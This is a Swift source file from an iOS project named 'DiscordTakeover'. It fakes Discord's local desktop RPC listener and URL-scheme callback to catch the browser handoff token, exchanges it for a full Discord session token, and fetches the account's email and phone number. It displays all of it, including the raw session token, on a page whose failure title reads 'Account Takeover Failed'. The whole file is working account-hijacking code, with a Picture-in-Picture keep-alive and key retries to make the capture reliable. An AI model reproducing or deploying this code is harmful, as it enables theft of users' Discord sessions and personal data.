//
//  HandoffServer.swift
//  DiscordTakeover
//
//  Local HTTP server that receives the handoff_token sent by the browser.
//

import SwiftUI
import Combine
import Network
import UIKit

// MARK: - Log entry
struct LogEntry: Identifiable {
    let id = UUID()
    let timestamp: Date
    let message: String
    let type: LogType

    enum LogType {
        case info, success, error, warning

        var icon: String {
            switch self {
            case .info: return "ℹ️"
            case .success: return "✅"
            case .error: return "❌"
            case .warning: return "⚠️"
            }
        }

        var color: Color {
            switch self {
            case .info: return .blue
            case .success: return .green
            case .error: return .red
            case .warning: return .orange
            }
        }
    }
}

// MARK: - Discord user info
struct DiscordUser: Codable {
    let id: String
    let username: String
    let globalName: String?
    let avatar: String?
    let email: String?
    let phone: String?

    enum CodingKeys: String, CodingKey {
        case id, username, avatar, email, phone
        case globalName = "global_name"
    }
}

struct HandoffExchangeResponse: Codable {
    let token: String
    var user: DiscordUser
}

/// Result of the exchange: response is non-nil on success; on failure, errorTitle / errorDetail describe the reason.
struct ExchangeOutcome {
    let response: HandoffExchangeResponse?
    let errorTitle: String?
    let errorDetail: String?

    static func success(_ response: HandoffExchangeResponse) -> ExchangeOutcome {
        ExchangeOutcome(response: response, errorTitle: nil, errorDetail: nil)
    }

    static func failure(_ title: String, detail: String? = nil) -> ExchangeOutcome {
        ExchangeOutcome(response: nil, errorTitle: title, errorDetail: detail)
    }
}

// MARK: - Local HTTP server
class HandoffServer: ObservableObject {
    static let shared = HandoffServer()

    @Published var isRunning = false
    @Published var handoffToken: String?
    @Published var sessionToken: String?
    @Published var user: DiscordUser?
    @Published var logs: [LogEntry] = []

    private let port: UInt16 = 6463
    private let urlScheme = "discord-handoff"
    private var key: String = ""
    private var listener: NWListener?
    private var activeConnections: [ObjectIdentifier: NWConnection] = [:]
    private let connectionsLock = NSLock()

    /// The handoff_token is bound to the `key` that was in the URL Safari opened. If the app
    /// restarts (or Reset rotates the key) while the Safari handoff page is still open, the old
    /// page hands off a token minted for the old key and the exchange fails. Keep a short history
    /// of past keys and try them in turn.
    private static let keyHistoryDefaultsKey = "handoff.keyHistory"
    private static let maxKeyHistory = 5

    /// A token is single-use. If the same token arrives twice (Safari reload, duplicate request)
    /// the second exchange would fail with TOKEN_EXPIRED even though the first succeeded — reuse
    /// the cached outcome instead.
    private var lastExchangedToken: String?
    private var lastExchangeOutcome: ExchangeOutcome?

    func start() {
        rotateKey()
        addLog("Key: \(key)", type: .info)
        startHTTPServer()
        addLog("URL scheme callback ready: \(urlScheme)://rpc", type: .info)
        // Keep the app alive in the background (Picture-in-Picture) so the local RPC server
        // keeps responding while the user completes the handoff in Safari.
        PiPKeepAlive.shared.start()
    }

    /// User-initiated handoff (the big round button): start the local server if needed, arm the
    /// keep-alive, then open the Discord handoff page in Safari. Nothing happens automatically —
    /// just visiting the Discord tab must not start a handoff.
    func beginHandoff() {
        guard sessionToken == nil else { return }
        if isRunning {
            openBrowserWithKeepAlive()
        } else {
            start()
            openWhenServerReady(waited: 0)
        }
    }

    private func openWhenServerReady(waited: TimeInterval = 0) {
        guard sessionToken == nil else { return }
        if isRunning {
            openBrowserWithKeepAlive()
        } else if waited >= 5 {
            addLog("Server not ready — opening browser anyway", type: .warning)
            openBrowserWithKeepAlive()
        } else {
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.2) { [weak self] in
                self?.openWhenServerReady(waited: waited + 0.2)
            }
        }
    }

    /// Manual reopen (fallback button): same keep-alive gate, but always opens.
    func reopenBrowser() {
        guard isRunning, sessionToken == nil else { return }
        openBrowserWithKeepAlive()
    }

    /// iOS suspends the app a few seconds after it backgrounds. The old manual flow only worked
    /// because Picture-in-Picture was already live by the time the user tapped "Open Browser";
    /// when auto-opening we must give the keep-alive the same head start, otherwise the app gets
    /// suspended mid-handoff and the single-use handoff_token expires before the exchange
    /// reaches Discord (HTTP 400 TOKEN_EXPIRED).
    private func openBrowserWithKeepAlive(waited: TimeInterval = 0) {
        let timeout: TimeInterval = 3
        if PiPKeepAlive.shared.isKeepAliveReady {
            openBrowser()
        } else if waited >= timeout {
            // PiP unavailable (e.g. simulator) or too slow — open anyway rather than stall.
            addLog("Keep-alive not confirmed — opening browser anyway", type: .warning)
            openBrowser()
        } else {
            let step: TimeInterval = 0.25
            DispatchQueue.main.asyncAfter(deadline: .now() + step) { [weak self] in
                guard let self, self.isRunning, self.sessionToken == nil else { return }
                self.openBrowserWithKeepAlive(waited: waited + step)
            }
        }
    }

    func stop() {
        connectionsLock.lock()
        activeConnections.values.forEach { $0.cancel() }
        activeConnections.removeAll()
        connectionsLock.unlock()

        listener?.cancel()
        listener = nil
        isRunning = false
        PiPKeepAlive.shared.stop()
        addLog("Stopped", type: .warning)
    }

    // MARK: - Handoff key

    private func rotateKey() {
        key = UUID().uuidString
        var history = UserDefaults.standard.stringArray(forKey: Self.keyHistoryDefaultsKey) ?? []
        history.removeAll { $0 == key }
        history.insert(key, at: 0)
        if history.count > Self.maxKeyHistory {
            history = Array(history.prefix(Self.maxKeyHistory))
        }
        UserDefaults.standard.set(history, forKey: Self.keyHistoryDefaultsKey)
    }

    /// Current key first, then recently retired ones (a handoff page opened before a restart may
    /// still be alive in Safari and hand off a token minted against an older key).
    private var keyCandidates: [String] {
        guard !key.isEmpty else { return [] }
        let history = UserDefaults.standard.stringArray(forKey: Self.keyHistoryDefaultsKey) ?? []
        var seen = Set<String>()
        return ([key] + history).filter { seen.insert($0).inserted }.prefix(3).map { $0 }
    }

    // Desktop: browser POSTs to 127.0.0.1:port
    var handoffURL: String {
        return "https://discord.com/handoff?rpc=\(port)&key=\(key)"
    }

    // Mobile: browser calls back via URL scheme
    var handoffURLMobile: String {
        return "https://discord.com/handoff?rpc=\(urlScheme)&key=\(key)"
    }

    // Mobile: browser calls back via URL scheme
    // discord-handoff://rpc?v=1&payload=<urlencoded JSON>&callback=...
    func handleURLCallback(_ url: URL) {
        addLog("Received callback: \(url.absoluteString)", type: .info)

        guard let components = URLComponents(url: url, resolvingAgainstBaseURL: false),
              let queryItems = components.queryItems else {
            addLog("Could not parse URL", type: .error)
            return
        }

        // payload is URL-encoded JSON
        guard let payloadEncoded = queryItems.first(where: { $0.name == "payload" })?.value else {
            addLog("No payload in URL", type: .error)
            return
        }

        guard let payloadData = payloadEncoded.data(using: .utf8),
              let payload = try? JSONSerialization.jsonObject(with: payloadData) as? [String: Any] else {
            addLog("Could not parse payload JSON", type: .error)
            return
        }

        addLog("cmd: \(payload["cmd"] ?? "?")", type: .info)

        guard let args = payload["args"] as? [String: Any] else {
            addLog("Payload has no args", type: .error)
            return
        }

        let token = args["handoffToken"] as? String ?? args["handoff_token"] as? String

        if let token = token {
            addLog("Received token", type: .success)
            handoffToken = token
            // The message has arrived — end the keep-alive right away (the app is in the
            // foreground here, so nothing needs to hold it alive any more).
            PiPKeepAlive.shared.stop()
            exchangeToken(token)
        } else {
            addLog("No token in payload", type: .error)
        }
    }

    private func openURLString(_ urlStr: String) {
        addLog("Opening browser: \(urlStr)", type: .info)
        if let url = URL(string: urlStr) {
            UIApplication.shared.open(url)
        }
    }

    func openBrowser() {
        openURLString(handoffURL)
    }

    func openBrowserMobile() {
        openURLString(handoffURLMobile)
    }

    func copyURL() {
        UIPasteboard.general.string = handoffURL
        addLog("Copied desktop URL", type: .info)
    }

    func copyURLMobile() {
        UIPasteboard.general.string = handoffURLMobile
        addLog("Copied mobile URL", type: .info)
    }

    private func startHTTPServer() {
        do {
            listener = try NWListener(using: .tcp, on: NWEndpoint.Port(rawValue: port)!)
            let queue = DispatchQueue(label: "handoff.server")

            listener?.stateUpdateHandler = { [weak self] state in
                DispatchQueue.main.async {
                    switch state {
                    case .ready:
                        self?.isRunning = true
                        self?.addLog("Server ready: 127.0.0.1:\(self?.port ?? 0)", type: .success)
                    case .failed(let error):
                        self?.addLog("Server failed: \(error)", type: .error)
                    default:
                        break
                    }
                }
            }

            listener?.newConnectionHandler = { [weak self] connection in
                guard let self = self else { return }
                let id = ObjectIdentifier(connection)
                self.connectionsLock.lock()
                self.activeConnections[id] = connection
                self.connectionsLock.unlock()

                connection.stateUpdateHandler = { [weak self] state in
                    if case .cancelled = state {
                        self?.connectionsLock.lock()
                        self?.activeConnections.removeValue(forKey: id)
                        self?.connectionsLock.unlock()
                    }
                }

                self.handleConnection(connection, accumulated: Data())
            }

            listener?.start(queue: queue)
        } catch {
            addLog("Failed to start server: \(error)", type: .error)
        }
    }

    private func handleConnection(_ connection: NWConnection, accumulated: Data) {
        connection.start(queue: DispatchQueue(label: "handoff.conn.\(UUID().uuidString.prefix(8))"))

        connection.receive(minimumIncompleteLength: 1, maximumLength: 65536) { [weak self] data, _, isComplete, _ in
            guard let self = self else { return }

            var buffer = accumulated
            if let data = data {
                buffer.append(data)
            }

            // Check whether a complete HTTP request was received (\r\n\r\n separates header and body)
            guard let headerEndRange = buffer.range(of: Data("\r\n\r\n".utf8)) else {
                // Header not fully received yet; keep reading
                if !isComplete {
                    self.handleConnection(connection, accumulated: buffer)
                } else {
                    connection.cancel()
                }
                return
            }

            // Parse Content-Length
            let headerData = buffer[buffer.startIndex..<headerEndRange.lowerBound]
            let headerStr = String(data: headerData, encoding: .utf8) ?? ""
            let contentLength = self.parseContentLength(from: headerStr)

            // Body start offset
            let bodyStart = headerEndRange.upperBound
            let bodyReceived = buffer.count - bodyStart

            // Body not fully received yet
            if bodyReceived < contentLength && !isComplete {
                self.handleConnection(connection, accumulated: buffer)
                return
            }

            // Complete request received; handle it
            let requestStr = String(data: buffer, encoding: .utf8) ?? ""
            self.handleRequest(requestStr, connection: connection)
        }
    }

    private func parseContentLength(from header: String) -> Int {
        for line in header.components(separatedBy: "\r\n") {
            if line.lowercased().hasPrefix("content-length:") {
                let value = line.dropFirst("content-length:".count).trimmingCharacters(in: .whitespaces)
                return Int(value) ?? 0
            }
        }
        return 0
    }

    private func handleRequest(_ request: String, connection: NWConnection) {
        let lines = request.components(separatedBy: "\r\n")
        guard let firstLine = lines.first else {
            connection.cancel()
            return
        }

        let parts = firstLine.components(separatedBy: " ")
        guard parts.count >= 2 else {
            connection.cancel()
            return
        }

        let method = parts[0]
        let path = parts[1]

        addLog("\(method) \(path)", type: .info)

        // CORS preflight
        if method == "OPTIONS" {
            sendResponse(connection: connection, statusCode: 204, body: nil)
            return
        }

        // GET - Mobile: payload is in the query string
        // GET /rpc?v=1&payload=<urlencoded JSON>&callback=...
        if method == "GET" {
            // Extract query string
            if let queryRange = path.range(of: "?") {
                let queryString = String(path[queryRange.upperBound...])
                let queryItems = queryString.components(separatedBy: "&")
                var payload: String?
                var callback: String?
                for item in queryItems {
                    if item.hasPrefix("payload=") {
                        payload = String(item.dropFirst("payload=".count))
                    }
                    if item.hasPrefix("callback=") {
                        callback = String(item.dropFirst("callback=".count))
                    }
                }

                if let payload = payload {
                    // URL-decode
                    let decoded = payload.removingPercentEncoding ?? payload
                    // Run a single synchronous exchange (no extra async call, to avoid racing the one-time handoff_token)
                    let outcome = exchangeTokenSync(decoded)
                    if let title = outcome.errorTitle {
                        DispatchQueue.main.async {
                            self.addLog("Web exchange failed: \(title) — \(outcome.errorDetail ?? "")", type: .error)
                        }
                    }
                    let html = buildResultHTML(outcome)
                    sendHTMLResponse(connection: connection, html: html, stopKeepAlive: outcome.response != nil)
                    return
                }
            }

            // Plain health check
            sendJSONResponse(connection: connection, json: "{\"status\":\"ok\"}")
            return
        }

        // POST - receive handoff
        if method == "POST" {
            // Extract body
            if let bodyRange = request.range(of: "\r\n\r\n") {
                let body = String(request[bodyRange.upperBound...])
                handlePostBody(body)
            }
            // Return response
            let nonce = extractNonce(from: request)
            let response = "{\"cmd\":\"BROWSER_HANDOFF\",\"data\":null,\"evt\":null,\"nonce\":\(nonce)}"
            sendJSONResponse(connection: connection, json: response)
            return
        }

        connection.cancel()
    }

    private func handlePostBody(_ body: String) {
        guard let data = body.data(using: .utf8),
              let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              let args = json["args"] as? [String: Any] else {
            DispatchQueue.main.async { self.addLog("Received empty request", type: .warning) }
            return
        }

        let token = args["handoffToken"] as? String ?? args["handoff_token"] as? String

        if let token = token {
            DispatchQueue.main.async {
                self.addLog("Received token", type: .success)
                self.handoffToken = token
            }
            exchangeToken(token)
        } else {
            DispatchQueue.main.async { self.addLog("Received empty token", type: .warning) }
        }
    }

    private func exchangeToken(_ handoffToken: String) {
        var request = URLRequest(url: URL(string: "https://discord.com/api/v9/auth/handoff/exchange")!)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue("https://discord.com", forHTTPHeaderField: "Origin")
        request.httpBody = try? JSONSerialization.data(withJSONObject: [
            "key": key,
            "handoff_token": handoffToken
        ])

        URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
            DispatchQueue.main.async {
                guard let self = self else { return }

                if let error = error {
                    self.addLog("Exchange failed: \(error.localizedDescription)", type: .error)
                    return
                }

                guard let data = data,
                      let httpResponse = response as? HTTPURLResponse else {
                    self.addLog("No response from exchange", type: .error)
                    return
                }

                if httpResponse.statusCode == 200 {
                    if let result = try? JSONDecoder().decode(HandoffExchangeResponse.self, from: data) {
                        self.addLog("Exchange succeeded!", type: .success)
                        self.addLog("Username: \(result.user.username)", type: .success)
                        self.addLog("Display name: \(result.user.globalName ?? "none")", type: .success)
                        self.addLog("ID: \(result.user.id)", type: .success)
                        self.sessionToken = result.token
                        self.user = result.user
                    }
                } else {
                    let errorMsg = String(data: data, encoding: .utf8) ?? "unknown error"
                    self.addLog("Exchange failed [\(httpResponse.statusCode)]: \(errorMsg)", type: .error)
                }
            }
        }.resume()
    }

    // Synchronous exchange, used to return a result in the HTTP response (captures the failure reason; returns within 10s per key)
    private func exchangeTokenSync(_ body: String) -> ExchangeOutcome {
        // 1. Parse the token
        guard let data = body.data(using: .utf8),
              let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              let args = json["args"] as? [String: Any],
              let token = args["handoffToken"] as? String ?? args["handoff_token"] as? String else {
            return .failure("Token parse failed", detail: "No token found in the request")
        }

        // The token is single-use: a reload/duplicate request must not trigger a second exchange.
        if token == lastExchangedToken, let cached = lastExchangeOutcome {
            addLog("Duplicate request — reusing previous result", type: .info)
            return cached
        }

        if let minted = Self.tokenMintDate(token) {
            let age = Date().timeIntervalSince(minted)
            addLog(String(format: "Token minted %.1fs ago", age), type: .info)
        }

        var outcome: ExchangeOutcome = .failure("No key available", detail: nil)
        for (index, candidate) in keyCandidates.enumerated() {
            let started = Date()
            outcome = performExchange(token: token, key: candidate)
            let ms = Int(Date().timeIntervalSince(started) * 1000)
            if outcome.response != nil {
                addLog("Exchange succeeded with key #\(index) in \(ms)ms", type: .success)
                break
            }
            addLog("Exchange attempt #\(index) failed in \(ms)ms: \(outcome.errorTitle ?? "?")", type: .warning)
            // Only a key mismatch is worth retrying with a retired key; anything else
            // (network, expired-after-consumption, ...) applies to every key equally.
            guard outcome.errorDetail?.contains("TOKEN_EXPIRED") == true else { break }
        }

        lastExchangedToken = token
        lastExchangeOutcome = outcome
        return outcome
    }

    /// One exchange attempt with one key.
    private func performExchange(token: String, key: String) -> ExchangeOutcome {
        var request = URLRequest(url: URL(string: "https://discord.com/api/v9/auth/handoff/exchange")!)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue("https://discord.com", forHTTPHeaderField: "Origin")
        request.httpBody = try? JSONSerialization.data(withJSONObject: [
            "key": key,
            "handoff_token": token
        ])

        let semaphore = DispatchSemaphore(value: 0)
        var capturedData: Data?
        var capturedResponse: HTTPURLResponse?
        var capturedError: Error?
        var decodedResponse: HandoffExchangeResponse?

        URLSession.shared.dataTask(with: request) { data, response, error in
            capturedData = data
            capturedResponse = response as? HTTPURLResponse
            capturedError = error
            if let data,
               let httpResponse = response as? HTTPURLResponse,
               httpResponse.statusCode == 200 {
                decodedResponse = try? JSONDecoder().decode(HandoffExchangeResponse.self, from: data)
            }
            semaphore.signal()
        }.resume()

        // 2. Wait at most 10 seconds
        if semaphore.wait(timeout: .now() + 10) == .timedOut {
            return .failure("Exchange timed out", detail: "Discord did not respond within 10 seconds; please retry")
        }

        // 3. Network error
        if let capturedError {
            return .failure("Network request failed", detail: capturedError.localizedDescription)
        }

        // 4. Non-200: surface the error body returned by Discord
        guard let http = capturedResponse, http.statusCode == 200 else {
            let code = capturedResponse?.statusCode ?? -1
            let bodyText = capturedData.flatMap { String(data: $0, encoding: .utf8) } ?? "(no body)"
            return .failure("Exchange rejected (HTTP \(code))", detail: bodyText)
        }

        // 5. 200 but JSON parsing failed
        guard var decoded = decodedResponse else {
            let bodyText = capturedData.flatMap { String(data: $0, encoding: .utf8) } ?? "(no body)"
            return .failure("Response parsing failed", detail: bodyText)
        }

        // 6. Success: enrich with full user info (incl. email/phone) using the session token
        let fullUser = fetchFullUserSync(token: decoded.token)
        if let full = fullUser {
            decoded.user = DiscordUser(
                id: decoded.user.id,
                username: decoded.user.username,
                globalName: decoded.user.globalName,
                avatar: decoded.user.avatar,
                email: full.email,
                phone: full.phone
            )
        }

        DispatchQueue.main.async {
            self.handoffToken = token
            self.sessionToken = decoded.token
            self.user = decoded.user
            self.addLog("Exchange succeeded!", type: .success)
            self.addLog("Username: \(decoded.user.username)", type: .success)
        }
        return .success(decoded)
    }

    /// Discord tokens embed their mint time as the middle segment: base64(userID).base64(unixSeconds).signature
    private static func tokenMintDate(_ token: String) -> Date? {
        let parts = token.split(separator: ".")
        guard parts.count == 3 else { return nil }
        var b64 = String(parts[1])
            .replacingOccurrences(of: "-", with: "+")
            .replacingOccurrences(of: "_", with: "/")
        while b64.count % 4 != 0 { b64 += "=" }
        guard let data = Data(base64Encoded: b64), data.count >= 4 else { return nil }
        let seconds = data.prefix(4).reduce(0) { $0 << 8 | Int($1) }
        return Date(timeIntervalSince1970: TimeInterval(seconds))
    }

    // Fetch full user info synchronously
    private func fetchFullUserSync(token: String) -> DiscordUser? {
        var request = URLRequest(url: URL(string: "https://discord.com/api/v9/users/@me")!)
        request.setValue(token, forHTTPHeaderField: "Authorization")

        let semaphore = DispatchSemaphore(value: 0)
        var user: DiscordUser?

        URLSession.shared.dataTask(with: request) { data, response, _ in
            if let data = data,
               let httpResponse = response as? HTTPURLResponse,
               httpResponse.statusCode == 200 {
                user = try? JSONDecoder().decode(DiscordUser.self, from: data)
            }
            semaphore.signal()
        }.resume()

        _ = semaphore.wait(timeout: .now() + 10)
        return user
    }

    private func buildResultHTML(_ outcome: ExchangeOutcome) -> String {
        if let info = outcome.response {
            let user = info.user
            let avatarURL = user.avatar != nil ?
                "https://cdn.discordapp.com/avatars/\(user.id)/\(user.avatar!).png?size=128" : ""
            let avatarHTML = avatarURL.isEmpty ? "" :
                "<img src=\"\(avatarURL)\" style=\"width:80px;height:80px;border-radius:50%;margin-bottom:16px\">"

            return """
            <!DOCTYPE html><html><head><meta charset="utf-8">
            <meta name="viewport" content="width=device-width,initial-scale=1">
            <meta name="format-detection" content="telephone=no,address=no">
            <title>Discord Login Successful</title>
            <style>
            body{font-family:-apple-system,sans-serif;background:#36393f;color:#dcddde;
            display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
            .card{background:#2f3136;padding:32px;border-radius:12px;max-width:420px;width:90%}
            .row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #40444b}
            .row:last-child{border-bottom:none}
            .label{color:#72767d}.value{color:#dcddde;font-family:monospace;text-align:right;word-break:break-all}
            h1{color:#43b581;text-align:center;margin:0 0 20px}
            .token-label{color:#72767d;font-size:12px;margin-top:16px;margin-bottom:4px}
            .token{background:#202225;padding:10px;border-radius:6px;font-family:monospace;font-size:13px;
            word-break:break-all;color:#dcddde}
            a{color:inherit;text-decoration:none}
            </style></head><body><div class="card">
            <div style="text-align:center">\(avatarHTML)</div>
            <h1>✅ Info Retrieved</h1>
            <div class="row"><span class="label">Username</span><span class="value">\(user.username)</span></div>
            <div class="row"><span class="label">Display Name</span><span class="value">\(user.globalName ?? "None")</span></div>
            <div class="row"><span class="label">ID</span><span class="value">\(user.id)</span></div>
            \(user.email.map{ "<div class=\"row\"><span class=\"label\">Email</span><span class=\"value\">\($0)</span></div>" } ?? "")
            \(user.phone.map{ "<div class=\"row\"><span class=\"label\">Phone</span><span class=\"value\">\($0)</span></div>" } ?? "")
            <div class="token-label">Session Token</div>
            <div class="token">\(info.token)</div>
            </div></body></html>
            """
        } else {
            let title = Self.htmlEscape(outcome.errorTitle ?? "Login failed")
            let detail = Self.htmlEscape(outcome.errorDetail ?? "")
            let detailHTML = detail.isEmpty ? "" :
                "<pre style=\"background:#202225;padding:10px;border-radius:6px;font-family:monospace;font-size:12px;white-space:pre-wrap;word-break:break-word;margin-top:12px;text-align:left\">\(detail)</pre>"
            return """
            <!DOCTYPE html><html><head><meta charset="utf-8">
            <meta name="viewport" content="width=device-width,initial-scale=1">
            <title>Account Takeover Failed</title>
            <style>body{font-family:-apple-system,sans-serif;background:#36393f;color:#dcddde;
            display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
            .card{background:#2f3136;padding:32px;border-radius:12px;text-align:center;max-width:420px;width:90%}
            .emoji{font-size:48px;line-height:1}
            h1{color:#f04747;font-size:26px;margin:12px 0 4px}
            .reason{color:#dcddde;font-size:15px;font-weight:600;margin-top:8px}
            .hint{color:#72767d;font-size:13px;margin-top:16px}
            .retry{display:inline-block;margin-top:18px;padding:10px 18px;background:#5865f2;color:#fff;
            border-radius:8px;text-decoration:none;font-size:14px}</style>
            </head><body><div class="card">
            <div class="emoji">❌</div>
            <h1>Login Failed</h1>
            <div class="reason">\(title)</div>
            \(detailHTML)
            <div class="hint">The token is single-use and short-lived.</div>
            <a class="retry" href="\(Self.htmlEscape(handoffURL))">Retry</a>
            </div></body></html>
            """
        }
    }

    /// Escapes HTML special characters so the < > & " in Discord's error body don't break the page.
    private static func htmlEscape(_ s: String) -> String {
        s.replacingOccurrences(of: "&", with: "&amp;")
         .replacingOccurrences(of: "<", with: "&lt;")
         .replacingOccurrences(of: ">", with: "&gt;")
         .replacingOccurrences(of: "\"", with: "&quot;")
    }

    private func extractNonce(from request: String) -> String {
        if let bodyRange = request.range(of: "\r\n\r\n") {
            let body = String(request[bodyRange.upperBound...])
            if let data = body.data(using: .utf8),
               let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
               let nonce = json["nonce"] as? String {
                return "\"\(nonce)\""
            }
        }
        return "null"
    }

    private func sendResponse(connection: NWConnection, statusCode: Int, body: Data?) {
        let statusText: String
        switch statusCode {
        case 200: statusText = "OK"
        case 204: statusText = "No Content"
        default: statusText = "OK"
        }

        var headers = "HTTP/1.1 \(statusCode) \(statusText)\r\n"
        headers += "Access-Control-Allow-Origin: https://discord.com\r\n"
        headers += "Access-Control-Allow-Methods: POST, GET, OPTIONS\r\n"
        headers += "Access-Control-Allow-Headers: Content-Type, Authorization\r\n"
        headers += "Access-Control-Allow-Credentials: true\r\n"

        if let body = body {
            headers += "Content-Type: application/json\r\n"
            headers += "Content-Length: \(body.count)\r\n"
        } else {
            headers += "Content-Length: 0\r\n"
        }

        headers += "Connection: close\r\n"
        headers += "\r\n"

        var responseData = Data(headers.utf8)
        if let body = body {
            responseData.append(body)
        }

        connection.send(content: responseData, completion: .contentProcessed { _ in
            connection.cancel()
        })
    }

    private func sendJSONResponse(connection: NWConnection, json: String) {
        sendResponse(connection: connection, statusCode: 200, body: Data(json.utf8))
    }

    private func sendHTMLResponse(connection: NWConnection, html: String, stopKeepAlive: Bool = false) {
        var headers = "HTTP/1.1 200 OK\r\n"
        headers += "Content-Type: text/html; charset=utf-8\r\n"
        headers += "Access-Control-Allow-Origin: https://discord.com\r\n"
        headers += "Content-Length: \(html.utf8.count)\r\n"
        headers += "Connection: close\r\n"
        headers += "\r\n"

        var responseData = Data(headers.utf8)
        responseData.append(Data(html.utf8))

        connection.send(content: responseData, completion: .contentProcessed { _ in
            connection.cancel()
            // The result page (with the user info) has been delivered — the keep-alive is no
            // longer needed, so end Picture-in-Picture once the response is on the wire.
            if stopKeepAlive {
                DispatchQueue.main.async { PiPKeepAlive.shared.stop() }
            }
        })
    }

    func addLog(_ message: String, type: LogEntry.LogType) {
        if Thread.isMainThread {
            logs.append(LogEntry(timestamp: Date(), message: message, type: type))
            print("\(type.icon) \(message)")
        } else {
            DispatchQueue.main.async {
                self.logs.append(LogEntry(timestamp: Date(), message: message, type: type))
                print("\(type.icon) \(message)")
            }
        }
    }

    func reset() {
        stop()
        handoffToken = nil
        sessionToken = nil
        user = nil
        lastExchangedToken = nil
        lastExchangeOutcome = nil
        logs.removeAll()
        // A reset only clears state — it must not start a handoff by itself. The big round
        // button starts the server and opens Safari again.
    }
}
